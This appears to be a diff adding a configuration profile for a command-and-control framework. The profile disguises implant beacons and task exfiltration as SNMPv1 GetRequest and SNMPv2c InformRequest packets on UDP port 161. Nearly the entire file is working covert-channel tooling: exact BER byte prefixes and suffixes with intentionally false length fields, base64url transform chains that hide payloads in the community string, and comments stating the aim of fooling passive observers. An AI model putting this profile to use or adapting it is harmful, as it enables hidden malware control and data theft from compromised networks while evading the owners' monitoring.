@@ -1,0 +1,143 @@
+[profile]
+name = "SNMP Mimicry"
+author = "LongHaul Team"
+
+# ==========================================================================
+# RAW - SNMP Protocol Mimicry (RFC 1157 / RFC 3416, UDP port 161)
+# ==========================================================================
+#
+# Usage:
+#   1. Create a raw listener: POST /api/v1/listeners with
+#        listener_type = "raw"
+#        listener_port = 161  (or any port for testing)
+#        listener_profile_contents = <contents of this file>
+#
+# Wire format — client to server:
+#
+#   GET (beacon):  SNMPv1 GetRequest-PDU with payload in the community string
+#   POST (exfil):  SNMPv2c InformRequest-PDU with payload in the community string
+#
+# Both use standard ASN.1/BER framing (RFC 1157 / RFC 3416). The payload is
+# embedded in the community string OCTET STRING field. BER length fields
+# (SEQUENCE length, OCTET STRING length, PDU length, VarBind lengths) are
+# set to their minimum-valid values — the same "intentionally minimal"
+# approach used by the NTP extension field length. Our server never validates
+# them; it extracts the payload by stripping the known-length prefix and suffix.
+#
+# GET packet structure:
+#   30 26            SEQUENCE, len=38 (lie)
+#     02 01 00       INTEGER version=0 (SNMPv1)
+#     04 06          OCTET STRING, len=6 (lie) ← community string = our payload
+#     <base64url-encoded msgpack beacon>
+#     a0 17          GetRequest-PDU [0], len=23 (lie)
+#       02 04 00 00 00 01   INTEGER requestID=1
+#       02 01 00            INTEGER error-status=0
+#       02 01 00            INTEGER error-index=0
+#       30 0D               VarBindList SEQUENCE, len=13
+#         30 0B             VarBind SEQUENCE, len=11
+#           06 08 2B 06 01 02 01 01 01 00   OID sysDescr.0 (1.3.6.1.2.1.1.1.0)
+#           05 00           NULL value
+#
+# POST packet structure:
+#   30 26            SEQUENCE, len=38 (lie)
+#     02 01 01       INTEGER version=1 (SNMPv2c)
+#     04 06          OCTET STRING, len=6 (lie) ← community string = our payload
+#     <base64url-encoded msgpack exfil>
+#     a7 17          InformRequest-PDU [7], len=23 (lie)
+#       02 04 00 00 00 01   INTEGER requestID=1
+#       02 01 00            INTEGER error-status=0
+#       02 01 00            INTEGER error-index=0
+#       30 0D               VarBindList SEQUENCE, len=13
+#         30 0B             VarBind SEQUENCE, len=11
+#           06 08 2B 06 01 02 01 01 03 00   OID sysUpTime.0 (1.3.6.1.2.1.1.3.0)
+#           43 01 00        TimeTicks value=0
+#
+# Server GET response (GetResponse-PDU):
+#   30 26            SEQUENCE, len=38 (lie)
+#     02 01 00       INTEGER version=0
+#     04 00          OCTET STRING, community="" (empty)
+#     a2 1C          GetResponse-PDU [2], len=28 (lie)
+#       02 04 00 00 00 01   INTEGER requestID=1
+#       02 01 00            INTEGER error-status=0
+#       02 01 00            INTEGER error-index=0
+#       30 0F               VarBindList SEQUENCE, len=15 (lie)
+#         30 0D             VarBind SEQUENCE, len=13 (lie)
+#           06 08 2B 06 01 02 01 01 01 00   OID sysDescr.0
+#           04 00           OCTET STRING, len=0 (lie) ← task bytes follow
+#   <base64url-encoded task bytes>
+#
+# Disambiguation:
+#   GET prefix byte 4 = 0x00 (SNMPv1, version INTEGER value = 0)
+#   POST prefix byte 4 = 0x01 (SNMPv2c, version INTEGER value = 1)
+#   Distinct at byte 4 in the 7-byte common prefix.
+#
+# NOTE on ports: SNMP GetRequest uses port 161. InformRequest also targets
+# port 161 (unlike Trap which uses 162). Using a single listener on 161 for
+# both is protocol-correct for InformRequest and acceptable for operational
+# use. A passive observer sees valid SNMP community-string traffic on 161.
+# ==========================================================================
+
+
+# --------------------------------------------------------------------------
+# GET — Beacon check-in (implant → server)
+# --------------------------------------------------------------------------
+[raw.get]
+proto = "udp"
+body = "<METADATA>"
+
+[raw.get.client.metadata]
+# Transform chain applied to msgpack beacon metadata before wire send:
+#   1. base64url-encode
+#   2. prepend 7-byte BER prefix: SEQUENCE tag + SNMPv1 version + OCTET STRING tag+len
+#   3. append 30-byte GetRequest-PDU + VarBind (OID sysDescr.0 + NULL)
+#
+# Wire result: [7-byte prefix][base64url payload][30-byte suffix]
+# Server reverses: strip 30-byte suffix, strip 7-byte prefix, base64url-decode.
+transforms = [
+    { op = "base64url" },
+    { op = "prepend", val = '\x30\x26\x02\x01\x00\x04\x06' },
+    { op = "append",  val = '\xa0\x17\x02\x04\x00\x00\x00\x01\x02\x01\x00\x02\x01\x00\x30\x0D\x30\x0B\x06\x08\x2B\x06\x01\x02\x01\x01\x01\x00\x05\x00' },
+]
+
+[raw.get.server]
+body = "<OUTPUT>"
+
+[raw.get.server.output]
+# Transform chain applied to task bytes before the server sends them back:
+#   1. base64url-encode
+#   2. prepend 37-byte GetResponse-PDU wrapper:
+#        SEQUENCE + version=0 + empty community + GetResponse-PDU [2]
+#        + requestID=1 + error fields + VarBind sysDescr.0 OCTET STRING len=0
+#
+# Wire result: [37-byte GetResponse header][base64url tasks]
+# Implant reverses: strip 37-byte prefix, base64url-decode.
+transforms = [
+    { op = "base64url" },
+    { op = "prepend", val = '\x30\x26\x02\x01\x00\x04\x00\xa2\x1C\x02\x04\x00\x00\x00\x01\x02\x01\x00\x02\x01\x00\x30\x0F\x30\x0D\x06\x08\x2B\x06\x01\x02\x01\x01\x01\x00\x04\x00' },
+]
+
+
+# --------------------------------------------------------------------------
+# POST — Task exfil (implant → server)
+# --------------------------------------------------------------------------
+[raw.post]
+proto = "udp"
+body = "<OUTPUT>"
+
+[raw.post.client.output]
+# Transform chain applied to msgpack exfil payload before wire send:
+#   1. base64url-encode
+#   2. prepend 7-byte BER prefix: SEQUENCE + SNMPv2c version (0x01) + OCTET STRING tag+len
+#   3. append 31-byte InformRequest-PDU + VarBind (OID sysUpTime.0 + TimeTicks=0)
+#
+# Wire result: [7-byte prefix][base64url payload][31-byte suffix]
+transforms = [
+    { op = "base64url" },
+    { op = "prepend", val = '\x30\x26\x02\x01\x01\x04\x06' },
+    { op = "append",  val = '\xa7\x17\x02\x04\x00\x00\x00\x01\x02\x01\x00\x02\x01\x00\x30\x0D\x30\x0B\x06\x08\x2B\x06\x01\x02\x01\x01\x03\x00\x43\x01\x00' },
+]
+
+[raw.post.server]
+# InformRequest ACK is a GetResponse in real SNMPv2c, but for exfil the
+# implant fires and moves on. No ACK sent.
+body = ""
